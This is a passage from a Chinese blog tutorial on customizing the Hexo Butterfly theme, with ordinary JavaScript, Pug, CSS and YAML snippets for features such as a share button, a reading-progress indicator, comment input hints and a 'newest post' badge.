class="number">0</span>; i &lt; <span class="number">5</span> - <span class="title class_">Math</span>.<span class="title function_">ceil</span>(num); i++) &#123; tmp += <span class="string">&#x27;&lt;i class=&quot;fa-regular fa-star&quot;&gt;&lt;/i&gt;&#x27;</span> &#125; <span class="comment">// 不够5个补 空心星星</span></span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="7-5"><p>在[blogRoot]\source_data下面新建collect.yml，弄过友链的应该都很熟悉。<br>按照如下格式配置即可(很像友链格式)</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">class_name:</span> <span class="string">📺</span> <span class="string">电影</span></span><br><span class="line">  <span class="attr">class_desc:</span> <span class="comment">#分类描述</span></span><br><span class="line">  <span class="attr">link_list:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">让子弹飞</span> <span class="comment">#名字</span></span><br><span class="line">      <span class="attr">img:</span> <span class="string">https://t1.szrtcpa.com/upload/vod/20220313-27/fa8e1f40e62df7aa609cba34f5ee8a25.jpg</span> <span class="comment">#图片链接</span></span><br><span class="line">      <span class="attr">score:</span> <span class="number">5</span> <span class="comment"># 1-5星</span></span><br><span class="line">      <span class="attr">icon:</span> <span class="string">fa-solid</span> <span class="string">fa-film</span> <span class="comment">#左上角图标</span></span><br><span class="line">      <span class="attr">tip:</span> <span class="string">电影</span> <span class="comment"># 右上角文字</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="分享本页"><a href="#分享本页" class="headerlink" title="分享本页"></a>分享本页</h1><p>作者链接：<a href="https://blog.leonus.cn/2022/rightside.html">https://blog.leonus.cn/2022/rightside.html</a></p><div class="tabs" id="8"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#8-1">引入ClipboardJS</button></li><li class="tab"><button type="button" data-href="#8-2">添加按钮</button></li><li class="tab"><button type="button" data-href="#8-3">添加自定义js</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="8-1"><p>在主题配置文件inject下的bottom添加如下代码，注意要放在自定义js文件的上面：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line"></span><br><span class="line">  bottom:</span><br><span class="line">    # clipboard</span><br><span class="line"><span class="addition">+    - &lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.11/clipboard.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    # 自定义js</span><br><span class="line">    - &lt;script src=&quot;/js/xxx.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="8-2"><p>在themes\butterfly\layout\includes\rightside.pug添加按钮：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+      when &#x27;share&#x27;</span></span><br><span class="line"><span class="addition">+        button.share(type=&quot;button&quot; title=&#x27;分享链接&#x27; onclick=&quot;share()&quot;)</span></span><br><span class="line"><span class="addition">+          i.fas.fa-share-nodes</span></span><br><span class="line"></span><br><span class="line">#rightside</span><br><span class="line">  - const &#123; enable, hide, show &#125; = theme.rightside_item_order</span><br><span class="line">  - const hideArray = enable ? hide &amp;&amp; hide.split(&#x27;,&#x27;) : [&#x27;readmode&#x27;,&#x27;translate&#x27;,&#x27;darkmode&#x27;]</span><br><span class="line"><span class="deletion">-  - const showArray = enable ? show &amp;&amp; show.split(&#x27;,&#x27;) : [&#x27;chat&#x27;,&#x27;comment&#x27;,&#x27;hideAside&#x27;,&#x27;toc&#x27;]</span></span><br><span class="line"><span class="addition">+  - const showArray = enable ? show &amp;&amp; show.split(&#x27;,&#x27;) : [&#x27;chat&#x27;,&#x27;share&#x27;,&#x27;comment&#x27;,&#x27;hideAside&#x27;,&#x27;toc&#x27;]</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="8-3"><p>在自定义js文件中添加如下代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 分享本页</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">share</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> url = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">origin</span> + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">pathname</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ClipboardJS</span>(<span class="string">&quot;.share&quot;</span>, &#123; <span class="attr">text</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="keyword">return</span> <span class="string">&#x27;标题：&#x27;</span> + <span class="variable language_">document</span>.<span class="property">title</span> + <span class="string">&#x27;\n链接：&#x27;</span> + url &#125; &#125;);</span><br><span class="line">    btf.<span class="title function_">snackbarShow</span>(<span class="string">&quot;本页链接已复制到剪切板，快去分享吧~&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="直达底部"><a href="#直达底部" class="headerlink" title="直达底部"></a>直达底部</h1><p>修改themes\butterfly\layout\includes\rightside.pug</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">button#go-up(type=&quot;button&quot; title=_p(&quot;rightside.back_to_top&quot;))</span><br><span class="line">  i.fas.fa-arrow-up</span><br><span class="line"></span><br><span class="line"><span class="addition">+button#go-down(type=&quot;button&quot; title=&quot;直达底部&quot; onclick=&quot;btf.scrollToDest(document.body.scrollHeight, 500)&quot;)</span></span><br><span class="line"><span class="addition">+  i.fas.fa-arrow-down</span></span><br></pre></td></tr></table></figure><h1 id="阅读进度"><a href="#阅读进度" class="headerlink" title="阅读进度"></a>阅读进度</h1><p>作者链接：<a href="https://blog.leonus.cn/2022/percent.html">https://blog.leonus.cn/2022/percent.html</a></p><div class="tabs" id="9"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#9-1">修改源码</button></li><li class="tab"><button type="button" data-href="#9-2">添加JS</button></li><li class="tab"><button type="button" data-href="#9-3">添加CSS</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="9-1"><p>修改文件<code>themes\butterfly\layout\includes\rightside.pug</code>，在最下面插入如下两行代码</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">button#go-up(type=&quot;button&quot; title=_p(&quot;rightside.back_to_top&quot;))</span><br><span class="line">  i.fas.fa-arrow-up</span><br><span class="line"><span class="addition">+  span#percent </span></span><br><span class="line"><span class="addition">+    span 0</span></span><br><span class="line"><span class="addition">+    span %</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="9-2"><p>在自定义js文件中加入如下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onscroll</span> = percent;<span class="comment">// 执行函数</span></span><br><span class="line"><span class="comment">// 页面百分比</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">percent</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollTop</span> || <span class="variable language_">window</span>.<span class="property">pageYOffset</span>, <span class="comment">// 卷去高度</span></span><br><span class="line">        b = <span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollHeight</span>, <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollHeight</span>, <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">offsetHeight</span>, <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">offsetHeight</span>, <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientHeight</span>, <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span>) - <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span>, <span class="comment">// 整个网页高度</span></span><br><span class="line">        result = <span class="title class_">Math</span>.<span class="title function_">round</span>(a / b * <span class="number">100</span>), <span class="comment">// 计算百分比</span></span><br><span class="line">        up = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#go-up&quot;</span>) <span class="comment">// 获取按钮</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result &lt;= <span class="number">95</span>) &#123;</span><br><span class="line">        up.<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span></span><br><span class="line">        up.<span class="property">childNodes</span>[<span class="number">1</span>].<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span></span><br><span class="line">        up.<span class="property">childNodes</span>[<span class="number">1</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">innerHTML</span> = result;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        up.<span class="property">childNodes</span>[<span class="number">1</span>].<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span></span><br><span class="line">        up.<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="9-3"><p>在自定义css文件中添加如下代码：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 返回顶部 */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">button</span><span class="selector-id">#go-up</span> <span class="selector-id">#percent</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">    <span class="attribute">font-weight</span>: bold;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">15px</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">button</span><span class="selector-id">#go-up</span> <span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">2</span>) &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">12px</span><span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">margin-right</span>: -<span class="number">1px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 鼠标滑动到按钮上时显示返回顶部图标 */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">button</span><span class="selector-id">#go-up</span><span class="selector-pseudo">:hover</span> <span class="selector-tag">i</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">button</span><span class="selector-id">#go-up</span><span class="selector-pseudo">:hover</span> <span class="selector-id">#percent</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="评论输入提醒"><a href="#评论输入提醒" class="headerlink" title="评论输入提醒"></a>评论输入提醒</h1><p>作者链接：<a href="https://blog.leonus.cn/2022/inputAlert.html">https://blog.leonus.cn/2022/inputAlert.html</a></p><p>添加自定义CSS文件</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 设置文字内容 :nth-child(1)的作用是选择第几个 */</span></span><br><span class="line"><span class="selector-class">.el-input</span><span class="selector-class">.el-input--small</span><span class="selector-class">.el-input-group</span><span class="selector-class">.el-input-group--prepend</span><span class="selector-pseudo">:nth-child</span>(<span class="number">1</span>)<span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;输入QQ号会自动获取昵称和头像🐧&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.el-input</span><span class="selector-class">.el-input--small</span><span class="selector-class">.el-input-group</span><span class="selector-class">.el-input-group--prepend</span><span class="selector-pseudo">:nth-child</span>(<span class="number">2</span>)<span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;收到回复将会发送到您的邮箱📧&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.el-input</span><span class="selector-class">.el-input--small</span><span class="selector-class">.el-input-group</span><span class="selector-class">.el-input-group--prepend</span><span class="selector-pseudo">:nth-child</span>(<span class="number">3</span>)<span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;可以通过昵称访问您的网站🔗&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 当用户点击输入框时显示 */</span></span><br><span class="line"><span class="selector-class">.el-input</span><span class="selector-class">.el-input--small</span><span class="selector-class">.el-input-group</span><span class="selector-class">.el-input-group--prepend</span><span class="selector-pseudo">:focus</span>-within<span class="selector-pseudo">::before</span>,</span><br><span class="line"><span class="selector-class">.el-input</span><span class="selector-class">.el-input--small</span><span class="selector-class">.el-input-group</span><span class="selector-class">.el-input-group--prepend</span><span class="selector-pseudo">:focus</span>-within<span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 主内容区 */</span></span><br><span class="line"><span class="selector-class">.el-input</span><span class="selector-class">.el-input--small</span><span class="selector-class">.el-input-group</span><span class="selector-class">.el-input-group--prepend</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="comment">/* 先隐藏起来 */</span></span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">    <span class="comment">/* 绝对定位 */</span></span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="comment">/* 向上移动60像素 */</span></span><br><span class="line">    <span class="attribute">top</span>: -<span class="number">60px</span>;</span><br><span class="line">    <span class="comment">/* 文字强制不换行，防止left:50%导致的文字换行 */</span></span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">    <span class="comment">/* 圆角 */</span></span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="comment">/* 距离左边50% */</span></span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="comment">/* 然后再向左边挪动自身的一半，即可实现居中 */</span></span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>);</span><br><span class="line">    <span class="comment">/* 填充 */</span></span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">14px</span> <span class="number">18px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#444</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 小角标 */</span></span><br><span class="line"><span class="selector-class">.el-input</span><span class="selector-class">.el-input--small</span><span class="selector-class">.el-input-group</span><span class="selector-class">.el-input-group--prepend</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="comment">/* 内容大小（宽高）为0且边框大小不为0的情况下，每一条边（4个边）都是一个三角形，组成一个正方形。</span></span><br><span class="line"><span class="comment">    我们先将所有边框透明，再给其中的一条边添加颜色就可以实现小三角图标 */</span></span><br><span class="line">    <span class="attribute">border</span>: <span class="number">12px</span> solid transparent;</span><br><span class="line">    <span class="attribute">border-top-color</span>: <span class="number">#444</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">48px</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">引入</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/twikoo.css&quot;</span> <span class="string">media=&quot;defer&quot;</span> <span class="string">onload=&quot;this.media=&#x27;all&#x27;&quot;&gt;</span> <span class="comment">#twikoo提醒</span></span><br></pre></td></tr></table></figure><h1 id="最新文章标志"><a href="#最新文章标志" class="headerlink" title="最新文章标志"></a>最新文章标志</h1><p>作者链接：<a href="https://blog.leonus.cn/2022/newpost.html">https://blog.leonus.cn/2022/newpost.html</a></p><div class="tabs" id="10"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#10-1">修改page.js</button></li><li class="tab"><button type="button" data-href="#10-2">修改post-ui.pug</button></li><li class="tab"><button type="button" data-href="#10-3">添加CSS</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="10-1"><p>首先我们需要在 <code>themes\butterfly\scripts\helpers\page.js</code> 内加入一段内容（位置任意，别放在其他函数里面即可）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 最新文章</span></span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">helper</span>.<span class="title function_">register</span>(<span class="string">&#x27;newPost&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> name, time;</span><br><span class="line">    hexo.<span class="property">locals</span>.<span class="title function_">get</span>(<span class="string">&#x27;posts&#x27;</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">item, index</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index == <span class="number">0</span>) name = item.<span class="property">title</span>, time = item.<span class="property">date</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (item.<span class="property">date</span> &gt; time) &#123; name = item.<span class="property">title</span>, time = item.<span class="property">date</span> &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="10-2"><p>然后在 <code>themes\butterfly\layout\includes\mixins\post-ui.pug</code> 添加如下代码(带颜色的是需要添加的代码，注意去掉最前面的加号，去掉之后不需要补空格)：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mixin postUI(posts)</span><br><span class="line"><span class="addition">+  - let newTitle= newPost()</span></span><br><span class="line">  each article , index in page.posts.data</span><br><span class="line">    .recent-post-item</span><br><span class="line">      -</span><br><span class="line">        let link = article.link || article.path</span><br><span class="line">        let title = article.title || _p(&#x27;no_title&#x27;)</span><br><span class="line">        const position = theme.cover.position</span><br><span class="line">        let leftOrRight = position <span class="comment">=== &#x27;both&#x27;</span></span><br><span class="line">          ? index%2 == 0 ? &#x27;left&#x27; : &#x27;right&#x27;</span><br><span class="line">          : position <span class="comment">=== &#x27;left&#x27; ? &#x27;left&#x27; : &#x27;right&#x27;</span></span><br><span class="line">        let post_cover = article.cover</span><br><span class="line">        let no_cover = article.cover <span class="comment">=== false || !theme.cover.index_enable ? &#x27;no-cover&#x27; : &#x27;&#x27;</span></span><br><span class="line">      -</span><br><span class="line">      if post_cover &amp;&amp; theme.cover.index_enable</span><br><span class="line">        .post_cover(class=leftOrRight)</span><br><span class="line">          a(href=url_for(link) title=title)</span><br><span class="line">            img.post_bg(src=url_for(post_cover) onerror=`this.onerror=null;this.src=&#x27;`+ url_for(theme.error_img.post_page) + `&#x27;` alt=title)</span><br><span class="line">      .recent-post-info(class=no_cover)</span><br><span class="line"><span class="addition">+        if newTitle == title</span></span><br><span class="line"><span class="addition">+          span(class=`newPost-$&#123;leftOrRight==&#x27;left&#x27;?&#x27;right&#x27;:&#x27;left&#x27;&#125;`) 最新</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="10-3"><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 最新文章图标 */</span></span><br><span class="line"><span class="selector-class">.newPost-left</span>,</span><br><span class="line"><span class="selector-class">.newPost-right</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#49b1f5</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span> <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.newPost-left</span> &#123;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">15px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.newPost-right</span> &#123;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">15px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="个人卡片修改"><a href="#个人卡片修改" class="headerlink" title="个人卡片修改"></a>个人卡片修改</h1><p>作者链接：<a href="https://moonshuo.cn/posts/12667.html">https://moonshuo.cn/posts/12667.html</a></p><p>添加自定义CSS</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*白天主题下的配置*/</span></span><br><span class="line"><span class="selector-id">#aside-content</span>&gt;<span class="selector-class">.card-widget</span><span class="selector-class">.card-info</span> &#123;</span><br><span class="line">  <span class="comment">/*换成自己图片的地址*/</span></span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/bg.jpg&#x27;</span>);</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">  <span class="attribute">background-attachment</span>: inherit;</span><br><span class="line">  <span class="attribute">background-size</span>: <span class="number">100%</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*黑暗主题下的配置*/</span></span><br><span class="line"><span class="selector-attr">[data-theme=dark]</span> <span class="selector-id">#aside-content</span>&gt;<span class="selector-class">.card-widget</span><span class="selector-class">.card-info</span> &#123;</span><br><span class="line">  <span class="comment">/*换成自己图片的地址*/</span></span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/bbg.png&#x27;</span>) <span class="meta">!important</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="导航栏居中"><a href="#导航栏居中" class="headerlink" title="导航栏居中"></a>导航栏居中</h1><p>作者链接：<a href="https://moonshuo.cn/posts/1481.html">https://moonshuo.cn/posts/1481.html</a></p><p>添加自定义CSS</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#nav-right</span>&#123;</span><br><span class="line"><span class="attribute">flex</span>:<span class="number">1</span> <span class="number">1</span> auto;</span><br><span class="line"><span class="attribute">justify-content</span>: flex-end;</span><br><span class="line"><span class="attribute">margin-left</span>: auto;</span><br><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">flex-wrap</span>:nowrap;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="导航栏常驻"><a href="#导航栏常驻" class="headerlink" title="导航栏常驻"></a>导航栏常驻</h1><p>作者链接：<a href="https://moonshuo.cn/posts/1481.html">https://moonshuo.cn/posts/1481.html</a></p><p>添加自定义CSS</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 